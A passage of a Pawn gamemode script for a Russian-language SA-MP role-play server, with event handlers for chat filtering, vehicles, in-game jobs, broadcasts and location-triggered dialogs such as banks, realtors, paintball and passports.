					format(STRING_GLOBAL, 128,"[A] %s[%d] был убит игроком %s[%d]", GetName(playerid),playerid,GetName(killerid),killerid);
					SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
					AC_GunCheattime[playerid]=3+floatround(GetPlayerPing(playerid)/100);
					SetPlayerCriminal(killerid, "Неизвестный", "Убийство человека");
					MysqlUpdatePlayerInt(playerid, "wanted", PI[playerid][pWanted]);
					MysqlUpdatePlayerInt(playerid, "wantedtime", PI[playerid][pWantedTime]);
				}
			}
		}
	}
	if(Ether[playerid] == true)
	{
		new CB[16];
		Ether[playerid] = false;
		Convert(GetPVarInt(playerid,"InEther"),CB);
		if(EtherSms[PI[playerid][pNews]-1] == true)
		{
		    STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, 90, "[F] %s выключил прием СМС", GetName(playerid));
			SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, STRING_GLOBAL);
		}
		if(EtherCall[PI[playerid][pNews]-1] == true)
		{
		    STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, 90, "[F] %s выключил прием звонков", GetName(playerid));
			SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, STRING_GLOBAL);
		}
        STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 90, "[F] %s вышел из прямого эфира [Время в эфире: %s, звонков: %i, СМС: %i]",GetName(playerid), CB, CallNews[PI[playerid][pNews]-1],SmsNews[PI[playerid][pNews]-1]);
		SendFMes(PI[playerid][pMember], COLOR_LIGHTBLUE, STRING_GLOBAL);
		EtherSms[PI[playerid][pNews]-1] = false;
		EtherCall[PI[playerid][pNews]-1] = false;
		SmsNews[PI[playerid][pNews]-1] = 0;
		CallNews[PI[playerid][pNews]-1] = 0;
		DeletePVar(playerid, "InEther");
		if(Mobile[playerid] != -1) MobileCrash(playerid);
	}
	if(EtherLive[playerid] == true)
	{
		EtherLive[playerid] = false;
		DeletePVar(playerid, "Etherfrac");
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы вышли из прямого эфира");
	}
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
    if(vehicleid < lastveh) SetVehicleData(vehicleid, veh_fuel, 100);
    if(VehInfos[vehicleid][vRightBlink])
	{
 		DestroyObject(Blink[vehicleid][0]);
      	DestroyObject(Blink[vehicleid][1]);
     	VehInfos[vehicleid][vRightBlink] = 0;
	}
	if(VehInfos[vehicleid][vLeftBlink])
	{
 		DestroyObject(Blink[vehicleid][2]);
      	DestroyObject(Blink[vehicleid][3]);
     	VehInfos[vehicleid][vLeftBlink] = 0;
	}
	if(VehInfos[vehicleid][vAvary] == 1)
	{
		DestroyObject(Blink[vehicleid][0]);
		DestroyObject(Blink[vehicleid][1]);
		DestroyObject(Blink[vehicleid][2]);
		DestroyObject(Blink[vehicleid][3]);
        VehInfos[vehicleid][vAvary] = 0;
	}

   	SetVehicleParamsEx(vehicleid, false, false, false, false, false, false, false);
 	Attach3DTextLabelToVehicle(g_vehicle[vehicleid][veh_number_label], vehicleid, 0.0, 0.0, 0.0);

	switch(GetVehicleModel(vehicleid))
	{
	    case 462,510,509,481: SetVehicleData(vehicleid, veh_fuel, 999);
	}

	if(GetVehicleData(vehicleid, veh_owner_id) != INVALID_PLAYER_ID)
	{
		for(new idx = 13; idx >= 0; idx --)
		{
			if(g_vehicle[vehicleid][veh_coms][idx] != 0) AddVehicleComponent(vehicleid, g_vehicle[vehicleid][veh_coms][idx]);
		}

		if(g_vehicle[vehicleid][veh_paintjob] != 3) ChangeVehiclePaintjob(vehicleid, g_vehicle[vehicleid][veh_paintjob]);

		if(GetVehicleData(vehicleid, veh_health) < 300.0) SetVehicleData(vehicleid, veh_health, 300.0);

		SetVehicleHealth(vehicleid, GetVehicleData(vehicleid, veh_health));
	}

	if(GetVehicleData(vehicleid, veh_owner_id) != INVALID_VEHICLE_ID && PI[GetVehicleData(vehicleid, veh_owner_id)][P_AREND_SCOOTER] == vehicleid)
	{
		new playerid = GetVehicleData(vehicleid, veh_owner_id);
		SendClientMessage(playerid, C_RED, "Аренда арендованного Вами транспорта была аннулирована.");
		DestroyVehicle(PI[playerid][P_AREND_SCOOTER]);
		PI[playerid][P_AREND_SCOOTER] = INVALID_VEHICLE_ID;
	}

	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}


public OnVehicleDeath(vehicleid, killerid)
{
    if(killerid != INVALID_PLAYER_ID && !IsPlayerConnected(killerid)) return 0;
    if(GetPlayerVehicleID(killerid) != vehicleid)
	{
		SetPVarInt(killerid, "car_spawn", GetPVarInt(killerid, "car_spawn") + 1);
		if(GetPVarInt(killerid, "car_spawn") >= 3) Kick(killerid);
    }
    /*new get_rent = GetArendCarID(vehicleid);
	if(get_rent != INVALID_VEHICLE_ID)
	{
	    new playerid = ArendInfo[get_rent][aPlayerID];
	    ArendInfo[get_rent][aPlayerID] = INVALID_PLAYER_ID;
	    if(IsPlayerConnected(playerid) && GetPVarInt(playerid, "arendkey") == get_rent)
	    {
	        SendClientMessage(playerid, C_RED, "Транспорт, который Вы арендовали, был уничтожен. Аренда закончилась");
	        SetPVarInt(playerid, "arendkey", 0);
	    }
	}*/

	if(GetVehicleData(vehicleid, veh_owner_id) != INVALID_VEHICLE_ID && PI[GetVehicleData(vehicleid, veh_owner_id)][P_AREND_SCOOTER] == vehicleid)
	{
		new playerid = GetVehicleData(vehicleid, veh_owner_id);
		SendClientMessage(playerid, C_RED, "Аренда арендованного Вами транспорта была аннулирована.");
		DestroyVehicle(PI[playerid][P_AREND_SCOOTER]);
		PI[playerid][P_AREND_SCOOTER] = INVALID_VEHICLE_ID;
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
    if(!PlayerLogged[playerid]) return 0;

	if(PI[playerid][pMuted])
	{
		SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		return 0;
	}

	/*if(GetPVarInt(playerid, "anti_flod") > gettime())
	{
		if(GetPVarInt(playerid, "anti_flod") > gettime()+5)
		{
			DeletePVar(playerid, "anti_flood_count");
			DeletePVar(playerid, "anti_flod");
		}

		SetPVarInt(playerid, "anti_flood_count", GetPVarInt(playerid, "anti_flood_count")+1);

		if(GetPVarInt(playerid, "anti_flood_count") == 10)
		{
			PI[playerid][pMuted] = 60;
			MysqlUpdatePlayerInt(playerid, "mute", PI[playerid][pMuted]);
			SendClientMessage(playerid, C_RED, "Вы получили мут на 1 минуту из-за флуда");
			DeletePVar(playerid, "anti_flood_count");
			DeletePVar(playerid, "anti_flod");
			return 0;
		}

		SendClientMessage(playerid, C_RED, "Пожалуйста, не флудите");
		return 0;
	}

	SetPVarInt(playerid, "anti_flod", gettime()+3);*/

	if(strfind(text, "PizDoS Bot", true) == 0) return BanEx(playerid, "AntiDoS: PizDoS_Bot");
	if(GetPVarInt(playerid, "TextTime") > GetTickCount()) return SKick(playerid, 2180);
	else SetPVarInt(playerid, "TextTime", GetTickCount()+50);
	if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid],text))
	{
	    SendClientMessage(playerid, C_RED, "Не флуди");
		return 0;
	}
	SetString(OldMessage[playerid],text);
	TextReset[playerid] = gettime()+3;
	if(emptyMessage(text)) return 0;
	if(IsIpFound(text) || CheckString(text))
	{
		PlayerGetsChatBan(playerid, text);
		return 0;
	}
	new mesid[128];
	if(EtherCalled[playerid] == true && IsANews(Mobile[playerid]))
	{
        if(Mobile[Mobile[playerid]] == playerid)
        {
            STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[%s] [Тел.] %s: %s",
			(PI[playerid][pNews] == 1)?("ст. Ритм"):
			(PI[playerid][pNews] == 2)?("Закрыто"):("Закрыто"), GetName(playerid), text);
			if(PI[playerid][pNews] == 1) SendNMes(1, TEAM_BLUE_COLOR, STRING_GLOBAL);
			else if(PI[playerid][pNews] == 2) SendNMes(2, TEAM_BLUE_COLOR, STRING_GLOBAL);
			else if(PI[playerid][pNews] == 3) SendNMes(3, TEAM_BLUE_COLOR, STRING_GLOBAL);
        }
        STRING_GLOBAL[0] = EOS;
  		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[Телефон] %s: %s", GetName(playerid), text);
		ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		return 0;
	}
	if(Mobile[playerid] != -1 && Ether[playerid] == false)
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[Телефон] %s: %s", GetName(playerid), text);
		ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		if(Mobile[Mobile[playerid]] == playerid) SendClientMessage(Mobile[playerid], COLOR_YELLOW, STRING_GLOBAL);
		return 0;
	}
	if(IsANews(playerid) && Ether[playerid] == true)
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[%s] %s: %s", Fraction_Name[PI[playerid][pMember]], GetName(playerid), text);
		if(PI[playerid][pNews] == 1) SendNMes(1, TEAM_BLUE_COLOR, STRING_GLOBAL);
		else if(PI[playerid][pNews] == 2) SendNMes(2, TEAM_BLUE_COLOR, STRING_GLOBAL);
		else if(PI[playerid][pNews] == 3) SendNMes(3, TEAM_BLUE_COLOR, STRING_GLOBAL);
		return 0;
	}
	if(EtherLive[playerid] == true)
	{
	    new enterfrac = GetPVarInt(playerid, "Etherfrac");

	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[LIVE][%s] %s: %s", Fraction_Name[enterfrac], GetName(playerid), text);
		if(enterfrac == TEAM_SMI) SendNMes(1, TEAM_BLUE_COLOR, STRING_GLOBAL);
		else if(enterfrac == TEAM_SFNEWS) SendNMes(2, TEAM_BLUE_COLOR, STRING_GLOBAL);
		else if(enterfrac == TEAM_LVNEWS) SendNMes(3, TEAM_BLUE_COLOR, STRING_GLOBAL);
		return 0;
	}
	for(new i; i < SMILE_COUNT; i++)
	{
		if(strcmp(text, SmileInfo[i][smInput], true) == 0)
		{
			if(PI[playerid][pSex] == 1)
			{
				MeAction(playerid, SmileInfo[i][smOutput_M]);
				SetPlayerChatBubble(playerid, SmileInfo[i][smOutput_M], COLOR_PURPLE, 13.0, 10000);
			}
			else
			{
				MeAction(playerid, SmileInfo[i][smOutput_F]);
				SetPlayerChatBubble(playerid, SmileInfo[i][smOutput_F], COLOR_PURPLE, 13.0, 10000);
			}
			return 0;
		}
	}
	if(strcmp(text, "ку", true) == 0 || strcmp(text, "q", true) == 0 || strcmp(text, "qq", true) == 0 || strcmp(text, "й", true) == 0)
	{
	    new member[20];
	    if(PI[playerid][pMember] == TEAM_ARMIYA)
	    {
			if(PI[playerid][pSex] == 1) MeAction(playerid, "отдал честь");
			else MeAction(playerid, "отдала честь");
	        return 0;
	    }
	    if(IsAGang(playerid))
	    {
	        switch(PI[playerid][pMember])
		    {
		        case TEAM_GROOVE: member = "ОПГ \"Тамбовская\"";
				case TEAM_BALLAS: member = "ОПГ \"Подольская\"";
				//case TEAM_RIFA: member = "Рифа";
				//case TEAM_OPGTEST2: member = "Ацтек";
				//case TEAM_VAGOS: member = "Вагос";
		    }
		    new string[50];
		    if(PI[playerid][pSex] == 1) format(string, sizeof(string), "показал распальцовку %s", member);
		    else format(string, sizeof(string), "показала распальцовку %s", member);
			MeAction(playerid, string);
		    if(!IsPlayerInAnyVehicle(playerid)) ApplyAnimation(playerid,"GHANDS","gsign1LH",4.0,0,0,0,0,0,1);
		    return 0;
		}
	}
	if(!IsPlayerInAnyVehicle(playerid))
	{
	    STRING_GLOBAL[0] = EOS;
	    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- %s {%s}(%s)", text, GetColor(playerid), GetName(playerid));
		format(mesid, sizeof(mesid), "- %s {%s}(%s)[%d]", text, GetColor(playerid), GetName(playerid), playerid);
		if(Settings[playerid][2] == 1) ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
		else ProxDetector(13.0, playerid, mesid, COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
		SetPlayerChatBubble(playerid, text, COLOR_GREEN, 13.0, 10000);
		if(!GetPVarInt(playerid, "Animation"))
		{
		    ApplyAnimation(playerid, "PED", "IDLE_CHAT", 8.1, 0, 1, 1, 1, 1);
			SetTimerEx("ClearAnimText", 2000, false, "d", playerid);
		}
	}
	else
	{
	    STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- (В машине) %s {%s}(%s)", text, GetColor(playerid), GetName(playerid));
		format(mesid, sizeof(mesid), "- (В машине) %s {%s}(%s)[%d]", text, GetColor(playerid), GetName(playerid), playerid);
		if(Settings[playerid][2] == 1) ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
		else ProxDetector(13.0, playerid, mesid, COLOR_GRAD5, COLOR_GRAD4, COLOR_GRAD3, COLOR_GRAD2, COLOR_GRAD1);
		SetPlayerChatBubble(playerid, text, COLOR_GREEN, 13.0, 10000);
	}
	return 0;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	return 0;
}

/*stock IsVehicleOccupiedEx(vehicleid)
{
	foreach(new i: Player) if(GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerVehicleID(i) == vehicleid) return 1;
	return 0;
}

stock IsVehicleOccupied(vehicleid)
{
    foreach(new i: Player) if(IsPlayerInVehicle(i, vehicleid)) return 1;
    return 0;
}*/

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	/*if(GetTickCount() - AC_EnterVehicledTick[playerid] < 5)
	{
		SendClientMessage(playerid, C_RED, "Пожалуйста, подождите");
		RemovePlayerFromVehicle(playerid);
		TogglePlayerControllable(playerid, false);
		TogglePlayerControllable(playerid, true);
	}
	else AC_EnterVehicledTick[playerid] = gettime() + 5;*/

	if(PI[playerid][P_JOB] == JOB_LOGGER)
	{
		SendClientMessage(playerid, COLOR_RED, "Вы не можете сесть в транспорт на работе.");
		RemovePlayerFromVehicle(playerid);
		ClearAnimations(playerid);
		return 1;
	}
	if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
	{
		SendClientMessage(playerid, COLOR_RED, "Вы не можете сесть в транспорт на работе.");
		RemovePlayerFromVehicle(playerid);
		ClearAnimations(playerid);
		return 1;
	}
	if(GetPVarInt(playerid, "relate") != 0 || GetPVarInt(playerid, "LessStatus") != 0)
	{
		SendClientMessage(playerid, -1, "Вы уронили груз из рук... Возвращайтесь обратно");
		switch(PI[playerid][P_JOB])
		{
			case JOB_MINER:
			{
				new idx = random(4);
				SetPlayerCheckpoint(playerid, coord_checkpoint_miner[idx][0], coord_checkpoint_miner[idx][1], coord_checkpoint_miner[idx][2], 3.0);
				RemovePlayerAttachedObject(playerid, 1);
				RemovePlayerAttachedObject(playerid,2);// забрали тачку
				RemovePlayerAttachedObject(playerid,3);// забрали тачку
				DeletePVar(playerid, "relate");
				DisablePlayerCheckpoint(playerid);
			}
			case JOB_FARMER:
			{
				RemovePlayerAttachedObject(playerid, 2);
				SetPVarInt(playerid, "relate", 0);
				DisablePlayerCheckpoint(playerid);
				new idx = random(sizeof coord_checkpoint_farmer);
				SetPlayerCheckpoint(playerid, coord_checkpoint_farmer[idx][0], coord_checkpoint_farmer[idx][1], coord_checkpoint_farmer[idx][2]-1.0, 2.0);
			}
			case JOB_GUN_COLLECTOR:
			{
				SendClientMessage(playerid, COLOR_RED, "Вы не можете сесть в транспорт на работе.");
				RemovePlayerFromVehicle(playerid);
				ClearAnimations(playerid);
				return 1;
			}
		}
	}
	if(pCuff[playerid][pCuffee] == playerid)
	{
		SendClientMessage(playerid, C_RED, "Вы не можете сесть в т/с в наручниках");
		RemovePlayerFromVehicle(playerid);
		ClearAnimations(playerid);
		return 1;
	}
	if(!ispassenger)
	{
	    /*if(IsVehicleOccupiedEx(vehicleid))
	    {
     		GameTextForPlayer(playerid, "~r~~h~CAR IS USED", 2000, 4);
  			ClearAnimations(playerid, true);
     		return 1;
	    }*/

		if(IsPlayerInVehicle(GetVehicleData(vehicleid, veh_driver_id), vehicleid) && GetPlayerState(GetVehicleData(vehicleid, veh_driver_id)) == PLAYER_STATE_DRIVER)
		{
  			ClearAnimations(playerid, true);

			new Float: x, Float: y, Float: z;
			GetPlayerPos(playerid, x, y, z);
			SetPlayerPos(playerid, x, y, z);

			return GameTextForPlayer(playerid, "~r~~h~CAR IS USED", 2000, 4);
		}
	}

	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(Ether[playerid] == true)
	{
		new CB[16];
		Ether[playerid] = false;
		Convert(GetPVarInt(playerid,"InEther"),CB);
		STRING_GLOBAL[0] = EOS;
		if(EtherSms[PI[playerid][pNews]-1] == true) { format(STRING_GLOBAL, 90, "[F] %s выключил прием СМС",GetName(playerid)); SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, STRING_GLOBAL); }

        STRING_GLOBAL[0] = EOS;
		if(EtherCall[PI[playerid][pNews]-1] == true) { format(STRING_GLOBAL, 90, "[F] %s выключил прием звонков",GetName(playerid)); SendFMes(PI[playerid][pMember], COLOR_LIGHTRED, STRING_GLOBAL); }

        STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, 90, "[F] %s вышел из прямого эфира [Время в эфире: %s, звонков: %i, СМС: %i]",GetName(playerid), CB, CallNews[PI[playerid][pNews]-1],SmsNews[PI[playerid][pNews]-1]);
		SendFMes(PI[playerid][pMember], COLOR_LIGHTBLUE, STRING_GLOBAL);
		EtherSms[PI[playerid][pNews]-1] = false;
		EtherCall[PI[playerid][pNews]-1] = false;
		SmsNews[PI[playerid][pNews]-1] = 0;
		CallNews[PI[playerid][pNews]-1] = 0;
		DeletePVar(playerid, "InEther");
		if(Mobile[playerid] != -1) MobileCrash(playerid);
	}
	if(GetPVarInt(playerid, "PriceTaxi") > 0)
	{
	    STRING_GLOBAL[0] = EOS;
	    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершен. Вами заработано: %iр", GetPVarInt(playerid, "TaxiMoney"));
		SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);
		SendClientMessage(playerid, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
		DeletePVar(playerid, "PriceTaxi");
		DeletePVar(playerid, "TaxiMoney");
		if(IsValidDynamic3DTextLabel(TaxiText3D[playerid])) DestroyDynamic3DTextLabel(TaxiText3D[playerid]);

		if(GetVehicleData(vehicleid, veh_driver_id) != INVALID_PLAYER_ID)
		{
			new i = GetPVarInt(i, "ClientID");
			DeletePVar(i, "TimeTaxi");
			DeletePVar(i, "TaxiPrice");
			DeletePVar(i, "PlayerTaxi");
		}

		DeletePVar(playerid, "ClientID");

		g_player_skills[playerid][S_TAXI_CALLS] ++;
		SavePlayerSkills(playerid);

		/*foreach(new i: Player)
		{
			if(PlayerLogged[i] == false) continue;
			if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) != 2)
			{
				DeletePVar(i, "TimeTaxi");
				DeletePVar(i, "TaxiPrice");
				DeletePVar(i, "PlayerTaxi");
			}
		}*/
	}
	if(GetPVarInt(playerid, "TaxiPrice") > 0)
	{
		DeletePVar(playerid, "TimeTaxi");
		DeletePVar(playerid, "TaxiPrice");
		DeletePVar(playerid, "PlayerTaxi");
	}
	if(EtherLive[playerid] == true)
	{
		EtherLive[playerid] = false;
		DeletePVar(playerid, "Etherfrac");
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы вышли из прямого эфира!");
	}

	return 1;
}

forward OnPlayerEnterDynamicArea(playerid, areaid);
public OnPlayerEnterDynamicArea(playerid, areaid)
{
	new player_state = GetPlayerState(playerid);

	if(player_state != PLAYER_STATE_ONFOOT) return 1;

	for(new idx; idx < sizeof g_area; idx ++)
	{
		if(areaid == g_area_total[idx])
		{
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid, g_area[idx][g_set_area_x], g_area[idx][g_set_area_y], g_area[idx][g_set_area_z]);
			SetPlayerFacingAngle(playerid, g_area[idx][g_set_area_r]);
			SetPlayerInterior(playerid, g_area[idx][g_set_area_interior]);
			SetPlayerVirtualWorld(playerid, g_area[idx][g_set_area_virtualworld]);
			break;
		}
	}
	if(TOTALENTRANCE != 0)
	{
		if(GetEntranceData(0, E_AREA_ENTER) <= areaid <= GetEntranceData(TOTALENTRANCE-1, E_AREA_ENTER))
		{
			new entranceid = areaid - GetEntranceData(0, E_AREA_ENTER);

			FreezePlayer(playerid, 5000);

			SetPlayerPos(playerid, 1657.3292,500.3488,299.4982);
			SetPlayerFacingAngle(playerid, 269.1680);

			SetCameraBehindPlayer(playerid);

			SetPlayerInterior(playerid, 3);

			SetPlayerVirtualWorld(playerid, entranceid + 1000);

			PI[playerid][P_IN_ENTRANCE] = entranceid;
		}
	}
	if(PI[playerid][P_IN_ENTRANCE] != -1)
	{
		new entranceid = PI[playerid][P_IN_ENTRANCE];

		if(areaid == AreaEntraceMenu)
		{
			ShowPlayerEntraceMenu(playerid);
		}
		if(areaid == AreaEntraceExit)
		{
			FreezePlayer(playerid, 5000);

			SetPlayerPos(playerid, GetEntranceData(entranceid, EXIT_POS_X),  GetEntranceData(entranceid, EXIT_POS_Y),  GetEntranceData(entranceid, EXIT_POS_Z));
			SetPlayerFacingAngle(playerid, GetEntranceData(entranceid, EXIT_ANGLE));

			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
		}
	}
	if(AreaBankMenu <= areaid <= AreaBankMenu3)
	{
		ShowPlayerBankMenu(playerid);
	}
	if(areaid == AreaSearhProperty)
	{
		ShowPlayerDialog
		(
			playerid, DIALOG_REALTOR_MENU, DIALOG_STYLE_LIST,
			"{FFCC00}Поиск свободной недвижимости",
			"1. Дом\n"\
			"2. Бизнес\n"\
			"3. Гараж",
			"Далее", "Закрыть"
		);
	}
	if(areaid == AreaRealtorInfo)
	{
		ShowPlayerDialog
		(
			playerid, DIALOG_REALTOR_INFO, DIALOG_STYLE_LIST,
			"{FFCC00}Информация о недвижимости",
			"1. Дом\n"\
			"2. Бизнес\n"\
			"3. Гараж",
			"Далее", "Закрыть"
		);
	}
	if(areaid == AreaParkingFine)
	{
		new rows, Cache: result;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE owner_name='%s' AND virtual=10000", GetName(playerid));
		result = mysql_query(dbHandle, STRING_GLOBAL);

		rows = cache_num_rows();

		if(!rows)
			return SendClientMessage(playerid, C_RED, "Ваших автомобилей нет на штрафстоянке");

		new fmt_str[70];

		new model;
		new number[32];

		STRING_GLOBAL[0] = EOS;
		for(new idx; idx < rows; idx ++)
		{
			cache_get_row(idx, 11, number, dbHandle, 32);

			if(!strcmp(number, "-1", false))
				number = "НЕТ НОМЕРОВ";

			model = cache_get_row_int(idx, 2);

			format(fmt_str, sizeof fmt_str, "%s (%d) [ %s ]\n", g_vehicle_info[model - 400][VI_NAME], model, number);
			strcat(STRING_GLOBAL, fmt_str);

			g_player_listitem[playerid][idx] = cache_get_row_int(idx, 0);
		}

		ShowPlayerDialog
		(
			playerid, DIALOG_PARKING_FINE, DIALOG_STYLE_LIST,
			"{FFCC00}Ваш транспорт на штрафстояне",
			STRING_GLOBAL,
			"Забрать", "Отмена"
		);

		cache_delete(result);
	}
	if(areaid == AreaRegPaintball)
	{
		if(g_paintball_info[PB_STATUS] != 1)
			return SendClientMessage(playerid, C_RED, "В данным момент регистрация на пейнтболл закрыта");

		if(PI[playerid][P_PB_TEAM] != -1)
			return SendClientMessage(playerid, C_RED, "Вы уже участвуете в пейнтболле");

		new team = random(2);
		PI[playerid][P_PB_TEAM] = team;

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы успешно зарегистрировались и попали в команду %s", team == 0 ? ("спецназа") : ("террористов"));
		SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s - %d голосов\n%s - %d голосов", g_paintball_map_name[0], g_paintball_info[PB_VOTE][0], g_paintball_map_name[1], g_paintball_info[PB_VOTE][1]);

		ShowPlayerDialog
		(
			playerid, DIALOG_PAINTBALL_SELECT_MAP, DIALOG_STYLE_LIST,
			"{FFCC00}Выбор карты",
			STRING_GLOBAL,
			"Выбрать", "Воздержаться"
		);
	}
	/*if(pickupid == bootlepic)
	{
		if(PI[playerid][pBottles] == 0)
			return SendClientMessage(playerid, C_RED, "У Вас нет бутылок");

		new string[88];
 		format(string,sizeof(string),"{FFFFFF}Пункт приёма бутылок. Желаете сдать бутылки?\nНа данный момент у Вас:{FFCC00} %d", PI[playerid][pBottles]);
   		ShowPlayerDialog(playerid, DIALOG_DELIVERY_BOTTLE, DIALOG_STYLE_MSGBOX,"{FFCC00}Приём бутылок",string,"Да","Нет");
		ShowPlayerDialog
		(
			playerid, DIALOG_DELIVERY_BOTTLE, DIALOG_STYLE_MSGBOX,
			"{FFCC00}Приём бутылок",
			"{FFFFFF}Вы действительно желаете сдать бутылки?",
			"Да", "Нет"
		);
	}*/

    if(areaid == AreaInfo[arServerHelp] && player_state == PLAYER_STATE_ONFOOT)
    {
		ShowPlayerDialog(playerid, 3793, DIALOG_STYLE_MSGBOX, "Помощь по серверу", "{FFFFFF}Добро пожаловать на сервер "SERVER_NAME"\n{FFFFFF}Если Вы на сервере впервые, то прочитайте эту информацию до конца", "Далее", "Отмена");
    }
    else if(areaid == AreaInfo[arAdminsZoneHP] && player_state == PLAYER_STATE_ONFOOT)
    {
        new Float:health;
        GetPlayerHealth(playerid, health);
		if(health < 100) SetHealth(playerid, 100.0);
		GameTextForPlayer(playerid, "~b~~h~You regain ~n~~b~~h~health", 3000, 1);
    }
    else if(areaid == AreaInfo[arHotdogHP] && player_state == PLAYER_STATE_ONFOOT)
    {
        if(PI[playerid][pLevel] > 3) return SendClientMessage(playerid, C_RED, "Бесплатная еда доступна до 3 уровня");
        else if(PI[playerid][pHunger] >= 100) return SendClientMessage(playerid, C_RED, "Вы не голодны!");
        else if(GetPVarInt(playerid, "floodeat") > gettime()) return SendClientMessage(playerid, C_RED, "Бесплатная еда доступна раз в 3 минуты");
        PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
		ClearAnimations(playerid);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
		if(PI[playerid][pHunger] <= 75) GiveHunger(playerid, 25);
    	else SetHunger(playerid, 100);
		if(PI[playerid][pSex] == 1) MeAction(playerid, "съел хот-дог");
		else MeAction(playerid, "съела хот-дог");
		GameTextForPlayer(playerid, "~g~have you ~n~eaten", 3000, 1);
		SetPVarInt(playerid, "floodeat", gettime()+180);
    }
	else if(areaid >= AreaInfo[arGettingPassport][0] && areaid <= AreaInfo[arGettingPassport][2] && player_state == PLAYER_STATE_ONFOOT)
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "1. Оформить паспорт\t\t\t(%dр)", MP1[3]);

		ShowPlayerDialog(playerid, D_PASS, 2, "Администрация области", STRING_GLOBAL, "Принять", "Отмена");
	}
	else if(areaid == AreaInfo[arGettingPassport][3] && player_state == PLAYER_STATE_ONFOOT)
	{
		ShowPlayerDialog(playerid, D_PASS+1, 2, "Больница г.Арзамас", ". Оформить мед. карту", "Принять", "Отмена");
	}
	else if(areaid == AreaInfo[arEuroSeti] && player_state == PLAYER_STATE_ONFOOT)
	{
        ShowPlayerDialog(playerid, D_ARMOURY+5, DIALOG_STYLE_LIST, "Выберите действие", "1. Купить телефон\t\t5000р\n2. Купить Сим-карту\t\t3000р\n3. Подключить интернет\t800р", "Выбрать", "Отмена");
	}
	else if(areaid == AreaInfo[arPoliciaA] && player_state == PLAYER_STATE_ONFOOT)
	{
		ShowPlayerDialog
		(
			playerid, D_POLMENU, 2, "Выберите пункт",
			"1. Купить лицензию на оружия\t\t(100000р)",
//			"2. Получить номера на транспорт\t(5000р)\n\"
//			"3. Купить лицензию на бизнес\t\t(100000р)",
			"Принять", "Отмена"
		);
	}
	else if(areaid == AreaInfo[arPoliciaB] && player_state == PLAYER_STATE_ONFOOT)
	{
		ShowPlayerDialog
		(
			playerid, D_POLMENU+1, 2, "Выберите пункт",
			"1. Купить лицензию на оружия\t\t(100000р)",
//			"2. Получить номера на транспорт\t(5000р)",
			"Принять", "Отмена"
		);
	}
	else if(areaid == AreaInfo[arBuyNarko][0] && player_state == PLAYER_STATE_ONFOOT)
	{
	    if(GetPVarInt(playerid, "next_actor")) return SendClientMessage(playerid, COLOR_GREY, "\
		Я тебе уже сказал, иди в соседнюю комнату");
		ShowPlayerDialog(playerid,1212,DIALOG_STYLE_INPUT," ", "\
		{FFFFFF}Эй, парень! Ты к кому пришёл?", "За травой", "Заблудился");
	}
	else if(areaid == AreaInfo[arBuyNarko][1] && player_state == PLAYER_STATE_ONFOOT)
	{
	    if(!GetPVarInt(playerid, "next_actor")) return SendClientMessage(playerid, COLOR_GREY, "Парень ты заблудился. Шагай отсюда!");
		ShowPlayerDialog(playerid,1213,DIALOG_STYLE_INPUT,"Покупка травы","\
		{FFFFFF}Введите количество пакетиков которое Вы хотите купить.","Купить","Отмена");
	}
